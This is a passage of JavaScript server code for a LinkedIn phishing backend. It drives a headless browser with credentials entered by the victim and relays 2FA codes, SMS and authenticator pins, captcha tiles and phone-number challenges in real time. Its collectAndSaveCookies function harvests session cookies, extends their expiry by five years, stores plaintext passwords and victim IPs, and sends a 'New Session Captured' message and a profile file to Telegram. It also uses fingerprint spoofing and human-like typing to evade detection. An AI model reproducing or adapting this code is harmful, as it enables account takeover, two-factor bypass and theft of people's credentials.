      customVendor: fingerprintOptions.customVendor
    };

    let page = await createAndSetupPage(browser, pageOptions);

    // Test connection before proceeding
    console.log('Testing connection...');
    const connectionWorking = await testBrowserConnection(page);
    if (!connectionWorking) {
      console.error('Connection test failed');
      await browser.close().catch(() => {});
      return res.status(500).send("Connection test failed. Please check your internet connection.");
    }
    console.log('Connection test successful!');

    // Get client IP
    const clientIp =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      req.connection.socket?.remoteAddress;

    // Navigate and login with retry mechanism
    let maxRetries = 2;
    let retryCount = 0;
    
    while (retryCount <= maxRetries) {
      try {
        // Check if browser is disconnected
        if (!browser.isConnected()) {
          console.log('Browser disconnected, creating new instance...');
          await browser.close().catch(() => {});
          browser = await createBrowser();
          page = await createAndSetupPage(browser);
        }

        // Check if page is valid
        try {
          await page.evaluate(() => document.title);
        } catch (pageError) {
          console.log('Page invalid, creating new page...');
          page = await createAndSetupPage(browser);
        }

        // Navigate to login page with retry
        let navigationSuccess = false;
        for (let navAttempt = 0; navAttempt < 3; navAttempt++) {
          try {
            await page.goto("https://www.linkedin.com/login", {
              waitUntil: 'domcontentloaded',
              timeout: 30000
            });
            navigationSuccess = true;
            break;
          } catch (navError) {
            console.log(`Navigation attempt ${navAttempt + 1} failed:`, navError.message);
            if (navAttempt === 2) throw navError;
            await delay(2000);
          }
        }

        if (!navigationSuccess) {
          throw new Error('Failed to navigate to login page');
        }

        // Wait for the page to stabilize
        await delay(2000);

        // Ensure we're on the login page
        const currentUrl = await page.url();
        if (!currentUrl.includes('linkedin.com/login')) {
          throw new Error('Not on login page, current URL: ' + currentUrl);
        }

        // Wait for login form with retry
        let formReady = false;
        for (let formAttempt = 0; formAttempt < 3; formAttempt++) {
          try {
            await page.waitForFunction(() => {
              const username = document.querySelector('#username');
              const password = document.querySelector('#password');
              const button = document.querySelector('.login__form_action_container button');
              return username && password && button;
            }, { timeout: 10000 });
            formReady = true;
            break;
          } catch (formError) {
            if (formAttempt === 2) throw new Error('Login form not ready: ' + formError.message);
            await delay(2000);
          }
        }

        if (!formReady) {
          throw new Error('Login form elements not found after retries');
        }

        // Clear and fill form
        await page.evaluate(() => {
          document.querySelector('#username').value = '';
          document.querySelector('#password').value = '';
        });

        await delay(1000);

        // Type credentials with human-like delays
        await page.type('#username', email, { delay: 100 });
        await delay(Math.random() * 500 + 500);
        await page.type('#password', password, { delay: 100 });
        await delay(Math.random() * 500 + 500);

        // Center the sign-in button in the viewport before clicking
        const submitResult = await page.evaluate(() => {
          const button = document.querySelector('.login__form_action_container button');
          if (button && !button.disabled) {
            // Scroll the button into the center of the viewport
            button.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' });
            // Optionally, add a border for visual debugging
            button.style.outline = '3px solid #ff9800';
            setTimeout(() => { button.style.outline = ''; }, 2000);
            button.click();
            return true;
          }
          return false;
        });

        if (!submitResult) {
          throw new Error('Submit button not clickable');
        }

        // Wait for navigation response
        try {
          await Promise.race([
            page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 30000 }),
            page.waitForSelector('input[name="pin"]', { timeout: 30000 }),
            page.waitForSelector('.body__banner--error', { timeout: 30000 })
          ]);
        } catch (navError) {
          console.log('Navigation after submit warning:', navError.message);
        }

        // Check for error banner
        const hasError = await page.evaluate(() => {
          const errorBanner = document.querySelector('.body__banner--error');
          return errorBanner && !errorBanner.classList.contains('hidden__imp');
        }).catch(() => false);

        if (hasError) {
          throw new Error('Login error displayed on page');
        }

        // Successful login
        console.log(`Login successful for session: ${sessionId}`);
        break;

      } catch (err) {
        console.error(`Login attempt ${retryCount + 1} failed:`, err.message);
        
        if (retryCount === maxRetries) {
          throw new Error(`Login failed after ${maxRetries + 1} attempts: ${err.message}`);
        }
        
        // Cleanup before retry
        try {
          await page.close().catch(() => {});
          page = await createAndSetupPage(browser);
        } catch (cleanupError) {
          console.error('Cleanup error:', cleanupError.message);
        }
        
        await delay(3000 * (retryCount + 1));
        retryCount++;
      }
    }

    // Store session with additional information including fingerprint profile
    sessions[sessionId] = {
      browser,
      page,
      fingerprintProfile: page._fingerprintProfile,
      userInfo: {
        email,
        password,
        ip: clientIp,
        userAgent: req.headers['user-agent'] || 'Unknown',
        timestamp: new Date().toISOString(),
      },
    };

    // Set a 10-minute timeout to close the browser if cookies haven't been saved
    setTimeout(async () => {
      if (sessions[sessionId]) {
        console.log(
          `Session ${sessionId} timed out after 10 minutes. Closing browser...`
        );
        try {
          await browser.close();
          delete sessions[sessionId];
          console.log(
            `Browser closed and session ${sessionId} cleaned up after timeout`
          );
        } catch (error) {
          console.error("Error closing browser after timeout:", error);
        }
      }
    }, 10 * 60 * 1000); // 10 minutes in milliseconds

    res.send("1");
    await delay(5000);
  } catch (err) {
    console.error("Error in /api/linkedin/login:", err);
    res.status(500).send(err);
  }
});

app.post("/api/linkedin/check-login-status", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.send("0");
  }

  let result = "0";
  try {
    const { page, browser } = session;

    // If a human solved reCAPTCHA externally, resume the automation
    if (session.recaptchaPassed) {
      try {
        // reset flag so we don't re-run repeatedly
        session.recaptchaPassed = false;
        const resumeResult = await resumeSession(sessionId);
        if (resumeResult && resumeResult !== false) {
          return res.send(resumeResult);
        }
      } catch (err) {
        console.error('Error while resuming session after recaptcha:', err);
      }
    }

    const currentUrl = await page.url();

    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    } else if (currentUrl.includes("/login-challenge-submit")) {
      // collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }

    try {
      // First check if the title contains "LinkedIn App Challenge"
      const pageTitle = await page.title();
      if (pageTitle.includes("LinkedIn App Challenge")) {
        const tryAnotherWayText = await page.evaluate(() => {
          const tryAnotherWay = document.querySelector("a#try-another-way");
          return tryAnotherWay ? tryAnotherWay.textContent.trim() : null;
        });
        return res.send(tryAnotherWayText);
      }

      const headerText = await page.evaluate(() => {
        const header = document.querySelector("h1.content__header");
        return header ? header.textContent.trim() : null;
      });

      if (headerText) {
        return res.send(headerText);
      }

      // Get h1 content
      const h1Content = await page.evaluate(() => {
        const h1 = document.querySelector("h1");
        return h1 ? h1.textContent.trim() : null;
      });

      if (h1Content) {
        const challengeResult = await handleCaptchaChallenge(
          page,
          browser,
          sessionId,
          0
        );
        // If the handler indicates a recaptcha is required, return a marker so the client can open the recaptcha page
        if (challengeResult === 'recaptcha') {
          return res.send('recaptcha');
        }
        return res.send(challengeResult);
      }
    } catch (evalError) {
      if (evalError.message.includes("Execution context was destroyed")) {
        return res.send("0");
      }
      throw evalError;
    }
  } catch (error) {
    console.error("Error Checking login status:", error);
  }
});

app.post("/api/linkedin/security-verification", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;

    // Get puzzle tiles HTML from all frames
    const frames = page.frames();
    console.log("Number of frames found:", frames.length);

    for (const frame of frames) {
      console.log("Checking frame URL:", frame.url());
      const tilesHtml = await frame.evaluate(() => {
        const tiles = document.querySelectorAll(
          "button.sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        console.log("Number of tiles found:", tiles.length);
        if (tiles.length > 0) {
          // Return array of HTML for all tiles
          return Array.from(tiles).map((tile) => tile.outerHTML);
        }
        return null;
      });

      if (tilesHtml) {
        console.log("Found tiles in frame:", frame.url());
        return res.json({
          status: "success",
          tiles: tilesHtml,
        });
      }
    }

    console.log("No puzzle tiles found in any frame");
    res.status(404).json({ error: "No puzzle tiles found" });
  } catch (err) {
    console.error("Error in security-verification:", err);
    res
      .status(500)
      .json({ error: "Failed to get puzzle tiles: " + err.message });
  }
});

app.post("/api/linkedin/select-tile", async (req, res) => {
  const { sessionId, tileNumber } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!tileNumber || tileNumber < 1 || tileNumber > 6) {
    return res
      .status(400)
      .json({ error: "Valid tile number (1-6) is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;
    const allFrames = page.frames();

    for (const frame of allFrames) {
      const clicked = await frame.evaluate((selectedTile) => {
        const tiles = document.querySelectorAll(
          ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        if (tiles[selectedTile - 1]) {
          tiles[selectedTile - 1].click();
          return true;
        }
        return false;
      }, tileNumber);

      if (clicked) {
        console.log(`Clicked tile number ${tileNumber}`);

        // Monitor URL changes
        const currentUrl = await page.url();
        let urlChanged = false;

        try {
          // Wait for either navigation or network idle
          await Promise.race([
            page.waitForNavigation({ timeout: 10000 }),
            page.waitForNetworkIdle({ timeout: 10000 }),
            new Promise((resolve) => setTimeout(resolve, 10000)),
          ]);

          // Add a small delay to ensure any redirects are completed
          await delay(2000);

          const newUrl = await page.url();
          urlChanged = newUrl !== currentUrl;

          if (urlChanged) {
            // console.log("URL changed from:", currentUrl, "to:", newUrl);
            if (newUrl.includes("/login-challenge-submit")) {
              // collectAndSaveCookies(page, sessionId);
              return res.send("lastcve");
            }

            // First check if the title contains "LinkedIn App Challenge"
            const pageTitle = await page.title();
            if (pageTitle.includes("LinkedIn App Challenge")) {
              const tryAnotherWayText = await page.evaluate(() => {
                const tryAnotherWay =
                  document.querySelector("a#try-another-way");
                return tryAnotherWay ? tryAnotherWay.textContent.trim() : null;
              });
              return res.send(tryAnotherWayText);
            }

            // Get only the verification header text
            const headerText = await page.evaluate(() => {
              const header = document.querySelector("h1.content__header");
              return header ? header.textContent.trim() : null;
            });
            console.log("Verification header:", headerText);

            // Return only the header text
            return res.send(headerText);
          }

          // console.log(
          //   "URL status:",
          //   urlChanged ? "Changed to: " + newUrl : "No change"
          // );
        } catch (error) {
          console.log("Navigation check details:", {
            error: error.message,
            currentUrl: await page.url(),
            isNavigating: page.isNavigating,
          });

          // Even if navigation check fails, try to get current state
          const finalUrl = await page.url();
          if (finalUrl.includes("/login-challenge-submit")) {
            // Handle the same way as successful navigation
            // collectAndSaveCookies(page, sessionId);
            return res.send("lastcve");
          }

          if (finalUrl.includes("feed")) {
            collectAndSaveCookies(page, sessionId);
            return res.send("1");
          }
        }
      }
    }
  } catch (error) {
    console.error("Error selecting tile:", error);
    res.status(500).json({ error: "Failed to select tile" });
  }
});

app.post("/api/linkedin/try-another-way", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    console.log("No session ID provided");
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    console.log("Session not found for ID:", sessionId);
    return res.send("0");
  }

  try {
    const { page } = session;

    // Wait for the element and click it, while handling navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.waitForSelector("a#try-another-way"),
      page.click("a#try-another-way"),
    ]);

    // Wait a moment for any state changes
    await delay(2000);

    // Get the header text after navigation
    const headerText = await page.evaluate(() => {
      const header = document.querySelector("h1.content__header");
      return header ? header.textContent.trim() : null;
    });
    console.log("Verification header:", headerText);

    // Return the header text
    return res.send(headerText || "0");
  } catch (error) {
    console.error("Error in try-another-way:", error);
    res.send("0");
  }
});

app.post("/api/linkedin/resend", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    console.log("No session ID provided");
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    console.log("Session not found for ID:", sessionId);
    return res.send("0");
  }

  try {
    const { page } = session;

    await page.waitForSelector("#reset-password-submit-button")

    await page.click("#reset-password-submit-button")

    // Wait for the element and click it, while handling navigation
    
    // Wait a moment for any state changes
    await delay(2000);

    return res.send("1");
  } catch (error) {
    console.error("Error in resend:", error);
    res.send("0");
  }
});

app.post("/api/linkedin/verify-code", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  let result = 0;
  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    const currentUrl = await page.url();

    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit

    if (currentUrl.includes("/login-challenge-submit")) {
      // collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-sms", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check current URL
    const currentUrl = await page.url();

    // Check if URL contains feeds and log it
    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit
    if (currentUrl.includes("/login-challenge-submit")) {
      // collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-authenticator", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check current URL
    const currentUrl = await page.url();

    // Check if URL contains feeds and log it
    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit
    if (currentUrl.includes("/login-challenge-submit")) {
      // collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }

    // Default response if no conditions are met
    return res.send("0");
  } catch (error) {
    console.error("Error in verify-authenticator:", error);
    return res
      .status(500)
      .json({ error: "Failed to verify authenticator code" });
  }
});

app.post("/api/linkedin/verify-phone", async (req, res) => {
  const { phone, countryCode, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!phone) {
    return res.status(400).json({ error: "Phone number is required" });
  }

  if (!countryCode) {
    return res.status(400).json({ error: "Country code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the country select and phone input fields
    await page.waitForSelector("#select-register-phone-country");
    await page.waitForSelector("#register-verification-phone-number");
    await page.waitForSelector("#register-phone-submit-button");

    // Select the country
    await page.select("#select-register-phone-country", countryCode);

    // Clear and type the phone number
    await page.evaluate(() => {
      const phoneInput = document.querySelector(
        "#register-verification-phone-number"
      );
      if (phoneInput) {
        phoneInput.value = "";
      }
    });
    await page.type("#register-verification-phone-number", phone);

    // Submit the form
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click("#register-phone-submit-button"),
    ]);

    // Wait a moment for any error message or redirect
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check if URL contains login-challenge-submit
    const currentUrl = await page.url();
    if (currentUrl.includes("/login-challenge-submit")) {
      // collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }

    // Check for success - look for verification page header
    const headerText = await page.evaluate(() => {
      const header = document.querySelector("h1.content__header");
      return header ? header.textContent.trim() : null;
    });

    if (headerText && headerText.includes("verify your phone number")) {
      return res.send("1");
    }

    // Default success response
    res.send("1");
  } catch (error) {
    console.error("Error submitting phone number:", error);
    res.status(500).json({ error: "Failed to submit phone number" });
  }
});

app.post("/api/linkedin/check-app", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    console.log("No session ID provided");
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    console.log("Session not found for ID:", sessionId);
    return res.send("0");
  }
  try {
    const { page } = session;

    const currentUrl = await page.url();
    console.log("Current URL:", currentUrl);

    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    try {
      // First check if the title contains "LinkedIn App Challenge"
      const pageTitle = await page.title();
      if (pageTitle.includes("LinkedIn App Challenge")) {
        return res.send("0");
      }
    } catch (evalError) {
      if (evalError.message.includes("Execution context was destroyed")) {
        console.log("Navigation detected, skipping page title text check");
        return res.send("0");
      }
      throw evalError;
    }
  } catch (error) {
    console.error("Error Checking login status:", error);
    res.send("0");
  }
});

async function collectAndSaveCookies(page, sessionId) {
  try {
    const cookies = await page.cookies();
    const fiveYearsInSeconds = 5 * 365 * 24 * 60 * 60; // 5 years in seconds

    // Get session information
    const session = sessions[sessionId];
    if (!session) {
      console.error("Session not found for ID:", sessionId);
      return;
    }

    const { userInfo, browser, fingerprintProfile } = session;
    const currentUrl = await page.url();

    // Send session info to Telegram with HTML formatting
    const sessionMessage = `<b>New Session Captured</b>\n\nName: LinkedIn\nUsername: ${userInfo.email}\nPassword: <tg-spoiler>${userInfo.password}</tg-spoiler>\nLanding URL: ${currentUrl}\nIP Address: ${userInfo.ip}\nUser Agent: <code>${userInfo.userAgent}</code>`;
    await sendTelegramMessage(sessionMessage);

    const filteredCookies = cookies.filter((cookie) =>
      [
        "lms_ads",
        "_guid",
        "ccookie",
        "bcookie",
        "fid",
        "__cf_bm",
        "g_state",
        "li_alerts",
        "lms_analytics",
        "fptctx2",
        "li_at",
        "lidc",
        "bscookie",
        "dfpfpt",
        "JSESSIONID",
        "li_gc",
        "li_rm",
        "li_sugr",
        "UserMatchHistory",
        "AnalyticsSyncHistory",
      ].includes(cookie.name)
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      // Add 5 years to the current expiration date
      const extendedExpiration =
        Math.floor(Date.now() / 1000) + fiveYearsInSeconds;

      if (cookie.name === "lms_ads") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_guid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "ccookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "bcookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "fid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "__cf_bm") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "g_state") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_alerts") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "lms_analytics") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "fptctx2") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: true,
          firstPartyDomain: "",
          partitionKey: null,
          storeId: null,
        };
      }

      if (cookie.name === "li_at") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "lidc") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "bscookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "dfpfpt") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "JSESSIONID") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_gc") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_rm") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_sugr") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "UserMatchHistory") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "AnalyticsSyncHistory") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session || false,
        firstPartyDomain: cookie.firstPartyDomain || "",
        partitionKey: cookie.partitionKey || null,
        storeId: cookie.storeId || null,
      };
    });

    // Create comprehensive profile with cookies and fingerprint data
    const comprehensiveProfile = {
      sessionId,
      timestamp: new Date().toISOString(),
      userInfo: {
        email: userInfo.email,
        password: userInfo.password, // Keep password in JSON - not redacted
        ip: userInfo.ip,
        userAgent: userInfo.userAgent
      },
      fingerprint: fingerprintProfile ? {
        profileId: fingerprintProfile.profileId,
        network: {
          ...fingerprintProfile.network,
          // Add IP:Port combination for proxy/connection use
          proxyEndpoint: `${fingerprintProfile.network.publicIP}:${fingerprintProfile.network.sourcePort}`,
          localEndpoint: `${fingerprintProfile.network.localIP}:${fingerprintProfile.network.sourcePort}`
        },
        device: fingerprintProfile.device,
        browser: fingerprintProfile.browser
      } : null,
      // Add standalone proxy information for easy access
      proxyInfo: fingerprintProfile ? {
        publicProxy: `${fingerprintProfile.network.publicIP}:${fingerprintProfile.network.sourcePort}`,
        localProxy: `${fingerprintProfile.network.localIP}:${fingerprintProfile.network.sourcePort}`,
        isp: fingerprintProfile.network.isp,
        country: fingerprintProfile.network.country,
        connectionType: fingerprintProfile.network.connectionType
      } : null,
      cookies: formattedCookies,
      loginUrl: currentUrl,
      success: true
    };

    // Save cookies in traditional format
    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);

    // Save comprehensive profile with fingerprint data (keeping password)
    const profileFilePath = path.join(cookiesDir, `comprehensive-${sessionId}.json`);
    // Save the complete profile without redacting password
    fs.writeFileSync(profileFilePath, JSON.stringify(comprehensiveProfile, null, 2));
    console.log(`Comprehensive profile saved to ${profileFilePath}`);

    // If this was a generated fingerprint profile, update it with actual cookies
    if (fingerprintProfile && fingerprintProfile.sessionType === 'fresh') {
      try {
        const updatedProfile = {
          ...fingerprintProfile,
          cookies: formattedCookies,
          sessionType: 'captured', // Mark as captured from real session
          metadata: {
            ...fingerprintProfile.metadata,
            lastUsed: new Date().toISOString(),
            capturedFrom: sessionId,
            loginSuccess: true
          }
        };
        fingerprintManager.saveProfile(updatedProfile);
        console.log(`Updated fingerprint profile ${fingerprintProfile.profileId} with captured cookies`);
      } catch (profileError) {
        console.error('Error updating fingerprint profile:', profileError);
      }
    }

    // Send the comprehensive profile to Telegram
    await sendTelegramFile(profileFilePath, `LinkedIn Profile for ${userInfo.email}`);

    // Wait 30 seconds before closing browser
    console.log("Waiting 30 seconds before closing browser...");
    await delay(30000);

    // Close browser and clean up session
    try {
